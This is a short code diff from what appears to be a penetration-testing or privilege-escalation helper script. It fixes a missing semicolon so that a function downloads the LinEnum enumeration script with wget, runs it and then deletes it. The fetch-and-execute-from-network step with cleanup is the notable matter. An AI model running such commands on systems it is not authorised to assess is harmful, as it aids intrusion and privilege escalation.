@@ -195,7 +195,7 @@ function escalate() {
 
 		function lineum(){
 				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 2>/dev/null
-				chmod +x LinEnum.sh ./LinEnum.sh; rm LinEnum.sh
+				chmod +x LinEnum.sh; ./LinEnum.sh; rm LinEnum.sh
 				read -p "Press Enter to continue"
 		}
 
